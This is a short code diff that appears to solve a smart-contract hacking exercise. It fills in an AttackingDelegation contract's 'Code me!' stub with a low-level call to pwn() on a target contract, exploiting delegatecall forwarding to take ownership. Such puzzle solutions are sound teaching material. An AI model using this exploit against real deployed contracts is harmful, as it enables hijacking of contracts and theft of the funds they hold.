@@ -5,11 +5,13 @@ import "./Delegation.sol";
 contract AttackingDelegation {
     address public contractAddress;
 
+
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
     }
 
     function hackContract() external {
         // Code me!
+        contractAddress.call(abi.encodeWithSignature("pwn()"));
     }
 }
